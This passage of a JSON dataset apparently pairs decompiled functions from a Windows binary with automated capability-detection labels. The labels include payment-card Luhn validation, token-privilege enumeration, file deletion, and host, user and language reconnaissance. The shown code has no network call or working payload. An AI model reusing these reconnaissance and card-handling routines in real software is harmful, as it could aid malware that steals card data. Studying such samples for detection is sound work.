            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488908(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack512;\n    uint uStack508;\n    uchar *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uchar *puStack492;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack504 = &stack0xfffffffc;\n    puStack492 = 0x48892c;\n    fcn.004059cc();\n    uStack496 = 0x4889ff;\n    uStack500 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe0c;\n    uStack508 = 0x4889c8;\n    uStack512 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe00;\n    puStack492 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.00403770();\n    fcn.0040350c();\n    fcn.004033b8();\n    param_2 = param_2 + -2;\n    if (0 < param_2) {\n        do {\n            fcn.004033e0();\n            fcn.00405718();\n            fcn.00405818();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    fcn.00405cd0();\n    fcn.004040ac();\n    fcn.00403918();\n    *in_FS_OFFSET = uStack512;\n    *in_FS_OFFSET = uStack500;\n    puStack492 = 0x488a06;\n    uStack496 = 0x4889f1;\n    fcn.00405530();\n    uStack496 = 0x4889fe;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 426
    },
    "00488a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00488a10(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack52 = 0x488a27;\n    fcn.004059cc();\n    uStack56 = 0x488a98;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_1eh = 3;\n    fcn.00405864();\n    var_1ah = fcn.004059dc();\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.00488a10::lpFileOp;\n    uStack56 = 0x488a9f;\n    iStack60 = 0x488a8f;\n    fcn.00405530();\n    iStack60 = 0x488a97;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 301
    },
    "00488d74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00488d74(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x488d84;\n    fcn.004059cc();\n    uStack20 = 0x488dda;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00421644();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421b58();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x488de1;\n    uStack20 = 0x488dd9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 190
    },
    "00488e28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00488e28(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x488e3d;\n    fcn.004059cc();\n    puStack20 = 0x488e45;\n    fcn.004059cc();\n    uStack24 = 0x488ea5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00421644();\n    fcn.00421720();\n    fcn.00421864();\n    uVar1 = 1;\n    fcn.00422798(1);\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x488eac;\n    uStack28 = 0x488ea4;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 234
    },
    "004890f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004890f8(void)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48910c;\n    fcn.004059cc();\n    uStack24 = 0x489192;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x489121;\n    puStack20 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack32 = 0x489129;\n    cVar1 = fcn.0040a25c();\n    if (cVar1 != '\\0') {\n        uStack36 = 0x489175;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        piVar2 = fcn.00404620();\n        (**(*piVar2 + 0x68))();\n        (**(*piVar2 + 0x1c))();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x48917c;\n        uStack36 = 0x489174;\n        fcn.00404650();\n        return;\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x489199;\n    uStack24 = 0x489191;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 381
    },
    "004891a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete file"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004891a0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack20 = 0x4891b4;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x4891bc;\n    fcn.004059cc();\n    uStack24 = 0x48924f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack36 = 0x48922d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack44 = 0x4891e0;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0040a25c();\n    if (cVar1 != '\\0') {\n        uStack44 = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    var_ch = fcn.00404620();\n    (**(*var_ch + 0x2c))();\n    (**(*var_ch + 0x74))();\n    *in_FS_OFFSET = uStack44;\n    uStack36 = 0x489234;\n    uStack40 = 0x48922c;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 387
    },
    "0048925c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048925c(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint ReturnLength;\n    int32_t *TokenInformation;\n    uint TokenHandle;\n    uint *var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x4893a8;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    var_4h = in_EAX;\n    fcn.00405530();\n    TokenInformation = fcn.00402f00();\n    uVar1 = sub.kernel32.dll_GetCurrentProcess(0x28, &TokenHandle);\n    iVar2 = sub.advapi32.dll_OpenProcessToken(uVar1);\n    if (iVar2 == 0) {\n        fcn.00488188();\n    }\n    iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, TokenInformation, 800, &ReturnLength);\n    if (iVar2 == 0) {\n        fcn.00488188();\n    }\n    uVar1 = fcn.00402f00();\n    uVar3 = fcn.00402f00();\n    iVar2 = *TokenInformation;\n    if (-1 < iVar2 + -1) {\n        var_14h = 0;\n        do {\n            var_1ch = 0xff;\n            var_18h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, TokenInformation + var_14h * 3 + 1, uVar1, &var_18h);\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA(0, uVar1, uVar3, &var_1ch, &var_20h);\n            fcn.00405728(*var_4h);\n            fcn.00405728(0x489404, 0);\n            TokenHandle = 0x489410;\n            fcn.004058e0();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    *in_FS_OFFSET = TokenHandle;\n    fcn.00405554(0x4893af);\n    return;\n}\n",
        "token_count": 610
    },
    "00489630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.00489630(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack100;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x48973b;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    piVar1 = fcn.00402f00();\n    uVar2 = sub.kernel32.dll_GetCurrentProcess(0x28, &fcn.00489630::TokenHandle);\n    iVar3 = sub.advapi32.dll_OpenProcessToken(uVar2);\n    if (iVar3 == 0) {\n        sub.kernel32.dll_Sleep_1(1);\n    }\n    uStack100 = 0x489689;\n    iVar3 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, piVar1, 800, &fcn.00489630::ReturnLength);\n    if (iVar3 == 0) {\n        uStack100 = 1;\n        sub.kernel32.dll_Sleep_1();\n    }\n    uVar2 = fcn.00402f00();\n    var_10h = fcn.00402f00();\n    iVar3 = *piVar1;\n    if (-1 < iVar3 + -1) {\n        var_ch = 0;\n        do {\n            var_14h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, piVar1 + var_ch * 3 + 1, uVar2, &fcn.00489630::var_14h);\n            uStack100 = 0;\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA();\n            fcn.00405728();\n            fcn.004894f0();\n            var_ch = var_ch + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack100;\n    fcn.00405530(0x489742);\n    return;\n}\n",
        "token_count": 561
    },
    "00489840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00489840(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x489857;\n    fcn.004059cc();\n    uStack32 = 0x489925;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48986d;\n    puStack28 = &stack0xfffffffc;\n    fcn.00405530();\n    uStack44 = 0x4898fd;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00421688();\n    fcn.00421720();\n    fcn.00421864();\n    cVar1 = fcn.0042228c();\n    if (cVar1 == '\\0') {\n        fcn.00405530();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421864();\n        cVar1 = fcn.004221e4();\n        if (cVar1 != '\\0') {\n            fcn.00421fe8();\n        }\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48992c;\n    uStack32 = 0x489924;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 377
    },
    "0048995c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048995c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x489973;\n    fcn.004059cc();\n    puStack28 = 0x48997b;\n    fcn.004059cc();\n    uStack32 = 0x489a3b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x489a0f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421688();\n    fcn.00421720();\n    fcn.00421864();\n    cVar1 = fcn.0042228c();\n    if (cVar1 == '\\0') {\n        fcn.00421788();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421864();\n        fcn.00421f88();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x489a42;\n    uStack32 = 0x489a3a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 357
    },
    "0048a17c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0048a17c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x48a18c;\n    fcn.004059cc();\n    uStack20 = 0x48a1c4;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(2);\n    uVar2 = 0x14;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x48a1cb);\n    return;\n}\n",
        "token_count": 202
    },
    "0048a574": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048a574(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 4;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00409d60();\n    return;\n}\n",
        "token_count": 63
    },
    "0048a59c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a59c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48a5b3;\n    fcn.004059cc();\n    uStack36 = 0x48a6a4;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x48a5c9;\n    puStack32 = &stack0xfffffffc;\n    fcn.00405530();\n    uStack48 = 0x48a66f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00421688();\n    fcn.00421720();\n    fcn.00421864();\n    cVar1 = fcn.0042228c();\n    if (cVar1 == '\\0') {\n        fcn.00405530();\n        *in_FS_OFFSET = uStack52;\n    }\n    else {\n        fcn.00421864();\n        cVar1 = fcn.004221e4();\n        if (cVar1 == '\\0') {\n            fcn.00405584();\n        }\n        else {\n            fcn.00421fe8();\n        }\n        *in_FS_OFFSET = uStack52;\n        puStack44 = 0x48a68e;\n        fcn.00404650();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48a6ab;\n    uStack36 = 0x48a6a3;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 431
    },
    "0048a6ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a6ec(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48a703;\n    fcn.004059cc();\n    puStack28 = 0x48a70b;\n    fcn.004059cc();\n    uStack32 = 0x48a7d2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48a7a6;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421688();\n    fcn.00421720();\n    fcn.00421864();\n    cVar1 = fcn.0042228c();\n    if (cVar1 == '\\0') {\n        fcn.00421788();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421864();\n        fcn.00421f88();\n        fcn.00404650();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48a7d9;\n    uStack32 = 0x48a7d1;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 373
    },
    "0048a950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a950(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint hObject;\n    uint var_8h;\n    uint var_4h;\n    double dVar3;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x48a967;\n    fcn.004059cc();\n    puStack32 = 0x48a96f;\n    fcn.004059cc();\n    uStack36 = 0x48aa1b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48a9ef;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x48a998;\n    puStack32 = &stack0xfffffffc;\n    fcn.0040a15c();\n    uStack60 = 0x48a9de;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fVar1 = fcn.0040d208();\n    dVar3 = fVar1;\n    fcn.0040a7ac(SUB84(dVar3, 0), dVar3 >> 0x20);\n    uVar2 = SUB84(dVar3, 0);\n    fcn.0040a39c();\n    *in_FS_OFFSET = uVar2;\n    uStack64 = 0x48a9e5;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 429
    },
    "0048aa2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048aa2c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48aa49;\n    fcn.00405fe8();\n    uStack24 = 0x48aabb;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00408550();\n    fcn.004055c8();\n    iStack32 = fcn.004059dc();\n    iVar1 = sub.kernel32.dll_LoadLibraryA();\n    if (iVar1 != 0) {\n        pcVar2 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x48aacc);\n        (*pcVar2)();\n        sub.kernel32.dll_FreeLibrary_1();\n        iStack32 = iVar1;\n    }\n    *in_FS_OFFSET = iStack32;\n    uStack24 = 0x48aac2;\n    iStack28 = 0x48aaac;\n    fcn.00405530();\n    iStack28 = 0x48aaba;\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 320
    },
    "0048ac60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048ac60(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack332;\n    uint uStack328;\n    uchar *puStack324;\n    int32_t iStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_122h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint *var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack324 = &stack0xfffffffc;\n    puStack312 = 0x48ac77;\n    fcn.004059cc();\n    uStack316 = 0x48ad21;\n    iStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uStack328 = 0x48acff;\n    iStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack312 = &stack0xfffffffc;\n    fcn.00403af4();\n    fcn.00403af4();\n    fcn.0040a918();\n    lpFileOp = 0;\n    var_1ah = &fcn.0048ac60::var_122h;\n    var_1eh = 3;\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.0048ac60::lpFileOp;\n    *in_FS_OFFSET = puStack324;\n    uStack316 = 0x48ad28;\n    iStack320 = 0x48ad20;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 381
    },
    "0048b070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk information"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b070(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack312 = &stack0xfffffffc;\n    puStack300 = 0x48b08a;\n    var_8h = param_2;\n    fcn.004059cc();\n    uStack304 = 0x48b117;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    uStack316 = 0x48b0ea;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack300 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0, 0, 0, &fcn.0048b070::var_ch, &fcn.0048b070::var_10h, &fcn.0048b070::var_115h, 0x105);\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA();\n    if (iVar2 != 0) {\n        fcn.0040aa98();\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x48b11e);\n    return;\n}\n",
        "token_count": 387
    },
    "0048b138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b138(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    puStack44 = 0x48b151;\n    fcn.004059cc();\n    uStack48 = 0x48b1ee;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x48b1c1;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(&fcn.0048b138::var_10h, &fcn.0048b138::var_18h);\n    iVar2 = (***0x492494)();\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            fcn.0048a864(SUB108(_var_10h, 0), _var_10h >> 0x40);\n        }\n        else {\n            fcn.0048a864(SUB108(_var_18h, 0), _var_18h >> 0x40);\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = 0;\n    uStack60 = 0x48b1f5;\n    uStack64 = 0x48b1ed;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 421
    },
    "0048b4bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\nvoid fcn.0048b4bc(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.advapi32.dll_GetUserNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.0040aa98();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0048b4f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0048b4f8(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.kernel32.dll_GetComputerNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.0040aa98();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0048b744": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b744(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack36 = 0x48b75e;\n    fcn.004059cc();\n    puStack36 = 0x48b766;\n    fcn.004059cc();\n    uStack40 = 0x48b820;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x48b780;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421644();\n    uStack52 = 0x48b7fe;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48b7d1;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421fe8();\n    *in_FS_OFFSET = uStack68;\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x48b805;\n    uStack52 = 0x48b7fd;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 386
    },
    "0048b944": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b944(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48b9a1;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00421644();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421fe8();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 140
    },
    "0048bcec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "identify system language via API"
        ],
        "decompiled_code": "\nvoid fcn.0048bcec(void)\n\n{\n    ushort uVar1;\n    uchar auStack108 [104];\n    \n    uVar1 = sub.kernel32.dll_GetUserDefaultLangID();\n    sub.kernel32.dll_VerLanguageNameA(uVar1, auStack108, 100);\n    fcn.004057a0();\n    return;\n}\n",
        "token_count": 76
    },
    "0048bf48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
